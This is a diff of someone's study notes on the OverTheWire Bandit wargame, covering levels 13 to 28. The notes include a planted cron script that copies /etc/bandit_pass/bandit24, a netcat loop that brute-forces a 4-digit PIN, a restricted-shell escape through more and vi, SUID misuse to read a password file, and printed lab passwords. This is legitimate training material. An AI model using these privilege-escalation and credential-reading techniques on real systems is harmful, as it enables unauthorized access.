@@ -70,9 +70,14 @@ sort data.txt | uniq -u
 ## Level 13 to 14
 ---
 *June 27, 2026*
-*Level Goal: The password for the next level is stored in **/etc/bandit_pass/bandit14 and can only be read by user bandit14**. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Look at the commands that logged you into previous bandit levels, and find out how to use the key for this level.  
+
+*Level Goal:
+```
+ The password for the next level is stored in **/etc/bandit_pass/bandit14 and can only be read by user bandit14**. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Look at the commands that logged you into previous bandit levels, and find out how to use the key for this level.  
 If you need help with this level: a hint file can be found in the home directory.  
-Make sure to read the error messages as they are informative.*
+Make sure to read the error messages as they are informative.
+```
+
 
 I have an experience of using an `scp` command to backup a data. 
 I also have an experience in setting up an SSH key but, this level flipped the things what i already know. 
@@ -461,6 +466,8 @@ The password is:
 - With SUID, the program runs as the file's owner regardless of who actually runs it.
 - In this level the file is a tool that temporarily grants the user `bandit19` the identity of user `bandit20`– just enough to read the password.
 
+*Note: This "SUID binary that runs a command you pass it" pattern reappears at [[Bandit_Wargames#Level 20 to 21]] (with added networking complexity) and [[Bandit_Wargames#Level 26 to 27]] (identical pattern, recognized immediately).*
+
 
 
 ---
@@ -484,6 +491,9 @@ ssh, nc, cat, bash, screen, tmux, Unix ‘job control’ (bg, fg, jobs, &, CTRL-
 ##### **My mental approach**
 ---
 This is like same principle to [[#Level 19 to 20]] but with complexity.
+
+*Note: Same SUID-binary pattern as [[Bandit_Wargames#Level 19 to 20]], but this one adds a networking layer — see also [[Bandit_Wargames#Level 26 to 27]] for the plain version without networking.*
+
 I checked the binary file:
 ```c
 bandit20@bandit:~$ stat suconnect
@@ -774,7 +784,7 @@ gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw
 
 ---
 
-## Level 23 - 24
+## Level 23 to 24
 ---
 *August 19, 2026*
 
@@ -807,4 +817,455 @@ cat cronjob_bandit24
 ====OUTPUT====
 @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
 * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+```
+
+Reading the script `cronjob_bandit24.sh
+```
+#!/bin/bash
+
+shopt -s nullglob
+
+myname=$(whoami)
+
+cd /var/spool/"$myname"/foo || exit 
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." ] && [ "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" "./$i")"
+        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
+            timeout -s 9 60 "./$i"
+        fi
+        rm -rf "./$i"
+    fi
+        
+```
+
+>Script self interpretation
+>I made some notes already at : [[Bash_Scripting]]
+
+- `shopt` — a shell option, made a note about this at [[Bash_Scripting#shopt]]
+- `myname` — storage for  the value of command `whoami` with [[Bash_Scripting#How to use command substitution|command substitution]]
+- `cd` — change dir OR `||` if it fails it `exit`
+- `for loop` — performs iteration to every file in the current dir.
+- `if` — it exclude string dot `.` (current dir) and the double dot `..` (parent dir above)  
+- `owner` — a var that stores the value of `stat` command with formatting.
+- `"./$i`" — filename the current dir. It changes each loop/iteration. 
+- `if` — nested if statement that checks the `owner` AND checks the if `$i` is a regular file.
+- `timeout` — a utility tool with `60` as its duration 
+- `-s 9` —  an option for [[Bash_Scripting#timeout|timeout]] command, means [[PROCESS#SIGKILL|sigkill]] 
+- `"./$i"` — the file being executed and will be stopped at exactly 60sec if it still running.
+- `rm -rf "./$i"` — a file deletion.
+
+They way i see the script flow is:
+- Every file in the `/var/spool/"$myname"/foo` will eventually be deleted because of the logic line at line `rm -rf "./$i"`
+- But, for a file that owned by by user `bandit23` – the file will be given 60 sec (`timeout`) to execute what's inside 
+- This is a loophole as logged in as `bandit23` to create a script file inside the directory and it will not be instantly deleted.
+
+>Creating my own script file.
+
+As im about to create i get an error:
+```
+====COMMAND====
+bandit23@bandit:/var/spool/bandit24/foo$ touch bandit23.sh && chmod +x bandit23.sh && nano bandit23.sh
+
+Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
+It is required for saving/loading search history or cursor positions.
+```
+
+I proceeded either way:
+```
+#!/bin/bash
+
+touch /home/bandit24/pass.txt
+chmod 777 /home/bandit24/pass.txt
+
+cat /etc/bandit_pass/bandit24 >> /home/bandit24/pass.txt
+```
+- i tried creating a file in the `bandit24` since that is the user who will execute the file according to script above.
+- i added a `chmod 777` for me to easy access the file
+- and read the pass for the user `bandit24` and append it in the file created.
+
+> But with this setup i see no result in the directory where i suppose to see it. 
+> Because this is wrong.
+> The owner for the home/bandit24 is not bandit24 but rather by `root`
+```
+bandit23@bandit:/tmp$ ls -lah /home/bandit24
+total 20K
+drwxr-xr-x   2 root root 4.0K Jun 24 14:58 .
+drwxr-xr-x 150 root root 4.0K Jun 24 15:02 ..
+-rw-r--r--   1 root root  220 Feb 13  2026 .bash_logout
+-rw-r--r--   1 root root 3.8K Jun 24 14:50 .bashrc
+-rw-r--r--   1 root root  807 Feb 13  2026 .profile
+```
+
+> I tried writing it in a tmp file:
+```
+#!/bin/bash 
+
+cat /etc/bandit_pass/bandit24 >/tmp/pass.txt 
+chmod 777 /tmp/pass.txt
+```
+**IT WORKED**
+
+---
+
+## Level 24 to 25
+---
+Level Goal: 
+```
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
+You do not need to create new connections each time
+```
+
+##### My Approach
+---
+- With this level, i was thinking of making a script file with a [[Bash_Scripting#For loops|for loops]]  logic inside to iterate and check each 4-digit combinations. 
+- I think this level tackles about the counting methods—particularly about Combinations. 
+
+Review and Decision tree:
+- Order matters: because 1234!=4321. 
+- A item/number can be used more than one.
+	- 1111 is valid
+- Therefore the fomula is `n^r` where 
+	- `n` = number of possible choice (1 to 10)
+	- `r` = number of slots(in this case is 4) 
+- 10 x 10 x 10 x 10 = 10,000
+
+==Script attempt== 1
+As usual the home dir is owned by root with no write access to everyone. 
+So making the script file at `/tmp`
+```bash
+#!/bin/bash
+
+for everynum in {0..9999};
+do
+  padded=$(printf "%04d" "${everynum}")
+  echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv ${padded}" | nc localhost 30002
+done
+```
+
+Got a message
+```
+bandit24@bandit:/tmp$ ./bruteforce
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct current password and pincode. Try again.
+```
+
+The issue:
+the command inside the loop: ` nc localhost 30002` runs only once and never closes.
+
+==Script Attemp== 2
+- Needed to add a flag `-N` to shutdown the connection after standard input
+- Added  a shell redirection to view the output in a file and not in a terminal
+```bash
+#!/bin/bash
+
+for everynum in {0..9999};
+do
+  padded=$(printf "%04d" "${everynum}")
+  echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv ${padded}" | nc -N localhost 30002 >> /tmp/output.txt 
+done
+```
+Didnt work as well, i tried reading the output file but its too noisy.
+
+==Script Attempt== 3
+- Added a filtering using grep to redirect to output
+```bash
+#!/bin/bash
+
+bandit24_pass="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"
+
+for everynum in {0..9999};
+do
+  padded=$(printf "%04d" "${everynum}")
+  echo "${bandit24_pass}" "${padded}" | nc -N localhost 30002 | grep -v "Wrong!" | grep -v "I am"  >> /tmp/output.txt
+done
+```
+It worked:
+```
+nano /tmp/output.txt
+Correct!
+The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
+```
+
+I added notes about the line `printf "%04d"` for more info:  [[Bash_Scripting#printf]]
+
+---
+
+## Level 25 to 26
+---
+Level Goal: 
+```
+Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not **/bin/bash**, but something else. Find out what it is, how it works and how to break out of it.
+
+> NOTE: if you’re a Windows user and typically use Powershell to `ssh` into bandit: Powershell is known to cause issues with the intended solution to this level. You should use command prompt instead.
+
+## Commands you may need to solve this level
+ssh, cat, more, vi, ls, id, pwd
+```
+
+##### My Approach
+---
+
+It says from bandit 25 session. 
+I have encounter the [[Linux_File_System__Major_Only_#/etc|/etc/passwd]] and also how to use the  [[Commands#Tips in *`cut`* command|cut command]] 
+
+>Attempt to extract the bandit26's shell:
+```
+bandit25@bandit:~$ cut -d":" -f 1,7 /etc/passwd | grep bandit26
+bandit26:/usr/bin/showtext
+```
+
+>Using it to log in:
+```
+ssh -p 2220 bandit26@bandit.labs.overthewire.org "/usr/bin/showtext"
+Received disconnect from 127.0.0.1 port 2220:2: no authentication methods enabled
+Disconnected from 127.0.0.1 port 2220
+```
+==Didnt work. Specifiying the `sh` didnt work as well==
+
+>Attempting to locate the `showtext` file.
+>Since its located in the `/usr/bin/`, maybe it can be read by everyone and not just for `bandit26`
+```
+bandit25@bandit:/usr/bin$ ls /usr/bin | grep "showtext"
+showtext
+```
+And there it is. Now reading the content:
+```
+bandit25@bandit:/usr/bin$ cat showtext
+
+#!/bin/sh
+
+export TERM=linux
+
+exec more ~/text.txt
+exit 0
+```
+- I made a note about [[Bash_Scripting#How to use export|export before proceeding]]
+- `TERM=linux` — explicitly saying to use the `linux` terminal
+- `exec` — i made a note out of it at : [[Bash_Scripting#exec|exec]]
+- `more` — i made a note out of it at : [[Bash_Scripting#more|more]]
+
+> Property of the file `showtext`
+```
+bandit25@bandit:/usr/bin$ stat  showtext
+  File: showtext
+  size: 58        	Blocks: 8          IO Block: 4096   regular file
+Device: 259,1	Inode: 26721       Links: 1
+Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
+Access: 2026-08-30 17:10:50.605904688 +0000
+Modify: 2026-06-24 14:59:17.553298407 +0000
+Change: 2026-06-24 14:59:17.559298448 +0000
+ Birth: 2026-06-24 14:59:17.553298407 +0000
+```
+
+Executing the file results to:
+```
+more: cannot open /home/bandit25/text.txt: No such file or directory
+```
+
+>I was about to just create a file in the `~/` to test but to my surprise there is already a sshkey file already:
+```
+bandit25@bandit:/usr/bin$ ls ~/
+bandit26.sshkey
+```
+So i proceeded to copy the file using [[Tools#**How to File Transfer using SCP**|scp]]
+```
+#FROM LOCAL MACHINE
+scp -P 2220 bandit25@bandit.labs.overthewire.org:~/bandit26.sshkey .
+```
+It was already at the `~/` i just missed it.
+
+>Now log in attempt:
+```
+linuxuser@linuxuser:~/bandit$ ssh -p 2220 -i bandit26.sshkey bandit26@bandit.labs.overthewire.org 
+```
+Resulted in:
+```
+Connection to bandit.labs.overthewire.org closed.
+```
+
+>Attemp 2: but since the bandit26 uses a different shell — `/usr/bin/showtext`. I will explicitly use that
+```
+ssh -p 2220 -i ~/bandit/bandit26.sshkey bandit26@bandit.labs.overthewire.org "/usr/bin/showtext"
+```
+After logging in its blank because the `more` replaced the `shell` so its giving a `prison` effect. 
+
+>==Attempt 3== — explicitly passing the showtext command broke the interactive prompt entirely
+```
+ssh -p 2220 -i bandit26.sshkey bandit26@bandit.labs.overthewire.org "/usr/bin/showtext"
+```
+Typing `!/bin/bash` while "inside" did nothing — no actual prompt to type into.
+
+>==Attempt 4== — logged in with no extra command (letting the default shell `showtext` run on its own)
+```
+ssh -p 2220 -i ./bandit26.sshkey bandit26@bandit.labs.overthewire.org
+```
+Result: banner prints fully, then immediately:
+```
+Connection to bandit.labs.overthewire.org closed.
+```
+No `--More--` prompt, no error from `more`, no chance to type anything.
+
+==Attempt 5== — suspected `-t` (force pseudo-terminal allocation) was the fix
+```
+ssh -t -p 2220 -i ./bandit26.sshkey bandit26@bandit.labs.overthewire.org
+```
+Same result — connection closes right after the banner.
+
+==Attempt 6== — suspected `TERM` mismatch (my shell reports `xterm-256color`, script forces `TERM=linux`)
+```
+TERM=linux ssh -t -p 2220 -i ./bandit26.sshkey bandit26@bandit.labs.overthewire.org
+```
+Still closed immediately. Ruled out `TERM` as the cause.
+
+==The actual root cause==
+`more` only pauses and shows a `--More--` prompt when the content is **taller than the terminal window**. Since `~/text.txt` is short, it fit entirely on one screen — `more` printed it instantly and let the script continue straight to `exit 0`, closing the connection before I could type anything. This is why no combination of `-t` or `TERM` mattered — the terminal itself wasn't the problem, its **size** was.
+
+==Attempt 7 — SUCCESS==
+- Shrunk the terminal window height as small as possible (a few lines tall) **before** SSHing in
+- Logged in normally:
+```
+ssh -p 2220 -i ./bandit26.sshkey bandit26@bandit.labs.overthewire.org
+```
+- Because the shrunk window couldn't fit the text, `more` was forced into paused/interactive mode, showing `--More--`
+- Pressed `v` — this is a `more` built-in shortcut that opens the current file in `vi`
+- Inside `vi`, entered command mode and ran:
+```
+:set shell=/bin/bash
+:shell
+```
+- This swapped the `vi` process's shell setting and spawned a real `/bin/bash` — breaking out of the `showtext` restriction entirely
+
+**Key lesson:** Pager programs (`more`, `less`, `vi`) are a real attack surface — they carry "convenience" features (like `v` for vi, or `!` for shell escape) that can be abused to break out of a restricted shell. The size of the terminal window itself became the deciding factor in whether the exploit was even reachable — something I never would've considered as a variable before this level.
+
+## Level 26 to 27
+---
+Level goal:
+```
+Good job getting a shell! Now hurry and grab the password for bandit27!
+
+## Commands you may need to solve this level
+
+ls
+```
+
+#### My Approach
+---
+
+This level is connected to level 26. 
+Once escaping the prison in level 26 the session will continue, there are two files:
+```
+bandit26@bandit:~$ ls
+bandit27-do  text.txt
+```
+
+The property of the file:
+```
+bandit26@bandit:~$ stat bandit27-do
+  File: bandit27-do
+  size: 14880     	Blocks: 32         IO Block: 4096   regular file
+Device: 259,1	Inode: 300268      Links: 1
+Access: (4750/-rwsr-x---)  Uid: (11027/bandit27)   Gid: (11026/bandit26)
+Access: 2026-08-30 21:26:17.513739188 +0000
+Modify: 2026-06-24 14:59:19.222310004 +0000
+Change: 2026-06-24 14:59:19.227310039 +0000
+ Birth: 2026-06-24 14:59:19.222310004 +0000
+```
+A [[User Management#**SUID**|suid]]
+
+*Note: Same SUID-binary-as-command-runner pattern as [[Bandit_Wargames#Level 19 to 20]] and [[Bandit_Wargames#Level 20 to 21]] — recognized immediately this time.*
+
+Attempt to execute it:
+```
+bandit26@bandit:~$ ./bandit27-do
+Run a command as another user.
+  Example: ./bandit27-do id
+```
+Attempt to run it with multiple susers but no avail:
+```
+bandit26@bandit:~$ ./bandit27-do bandit26
+env: 'bandit26': Permission denied
+bandit26@bandit:~$ ./bandit27-do bandit27
+env: 'bandit27': Permission denied
+bandit26@bandit:~$ ./bandit27-do root
+env: 'root': Permission denied
+bandit26@bandit:~$ 
+```
+
+>Checking the current shell since its wierd looking:
+```
+bandit26@bandit:~$ echo $SHELL
+/usr/bin/showtext
+```
+
+Upon searching for ways to change shell. A command `chsh` comes up:
+```
+bandit26@bandit:~$ chsh
+Password: 
+```
+Its asking for password so i tried to retrieve at: `/etc/bandit_pass/bandit26`
+```
+bandit26@bandit:~$ ls  /etc/bandit_pass && cat /etc/bandit_pass/bandit26
+bandit0  bandit10  bandit12  bandit14  bandit16  bandit18  bandit2   bandit21  bandit23  bandit25  bandit27  bandit29  bandit30  bandit32  bandit4  bandit6  bandit8
+bandit1  bandit11  bandit13  bandit15  bandit17  bandit19  bandit20  bandit22  bandit24  bandit26  bandit28  bandit3   bandit31  bandit33  bandit5  bandit7  bandit9
+jHdv2ELQhT22BkprMNDjybZDAkw1zeBJ
+```
+Upon using it. It says:
+```
+bandit26@bandit:~$ chsh
+Password: 
+chsh: PAM: Authentication failure
+bandit26@bandit:~$ 
+```
+Even with specified flags stil the same:
+```
+chsh -s /bin/bash
+```
+
+At this point im not sure if i should solve the shell issue first
+
+#### The proper Approach
+---
+I misread the message in the initial of file:
+```
+bandit26@bandit:~$ ./bandit27-do
+Run a command as another user.
+  Example: ./bandit27-do id
+```
+I though i need to input a username as argument...its supposed to be a `command`
+
+With that :
+```
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+STJLJBRRphMxKB392CT4iOr5CbzPU9ER
+bandit26@bandit:~$ 
+```
+
+---
+
+## Level 27 to 28
+---
+September 04, 2026
+
+Level Goal:
+```
+There is a git repository at `ssh://bandit27-git@bandit.labs.overthewire.org/home/bandit27-git/repo` via the port `2220`. The password for the user `bandit27-git` is the same as for the user `bandit27`.
+
+From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.
+
+## Commands you may need to solve this level
+
+git
+```
+
+This one i considered easy since i have a basic knowledge about what is [[Git Workflow & Commands|git]] is.
+But i didnt know where or how to insert the port `2220` so i had to gogle how to insert it.
+
+Found this  pattern
+```
+git clone ssh://git@server.com:custom_port/path/to/repo.git
 ```
